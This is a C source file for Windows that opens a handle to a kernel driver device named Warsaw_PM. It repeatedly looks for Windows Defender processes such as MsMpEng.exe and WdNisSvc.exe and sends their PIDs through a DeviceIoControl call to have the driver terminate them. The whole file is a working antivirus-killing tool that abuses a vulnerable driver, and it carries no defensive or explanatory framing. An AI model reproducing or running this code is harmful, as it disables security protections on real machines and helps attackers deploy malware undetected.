#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

#define IOCTL_CODE 0x22201C

const char* targetprocess[] = {
    "MsMpEng.exe",
    "MsMpEngCP.exe",
    "WindowsDefender.exe",
    "WdNisSvc.exe",
    "WinDefend.exe",
    NULL
};

DWORD FindProcessIdByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Snapshot creation failed\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[!] Process32First failed, stopped enum\n");
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    HANDLE hDriver = INVALID_HANDLE_VALUE;
    DWORD bytesReturned;
    BYTE buffer[1036] = {0};
    BOOL success;
    DWORD targetPid;

    hDriver = CreateFileW(
        L"\\\\.\\Warsaw_PM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open handle\n");
        return 1;
    }

    printf("[+] Driver looaded! Handle: %p\n", hDriver);
    printf("[*] target process enum..\n");

    while (1) {
        for (int i = 0; targetprocess[i] != NULL; i++) {
            targetPid = FindProcessIdByName(targetprocess[i]);

            if (targetPid != 0) {
                printf(" Process found %s with PID: %lu\n", targetprocess[i], targetPid);
                printf("Trying to kill process - %s\n", targetprocess[i]);

                memcpy(buffer, &targetPid, sizeof(DWORD));

                success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    buffer,
                    sizeof(buffer),
                    NULL,
                    0,
                    &bytesReturned,
                    NULL
                );

                if (!success) {
                    printf("[!] shit, got error\n");
                } else {
                    printf("[+] IOCTL 0x%08X sent\n", IOCTL_CODE);
                }
            }
        }
        Sleep(1000);
    }

    CloseHandle(hDriver);
    printf("[*] Driver handle closed.\n");
    return 0;
}
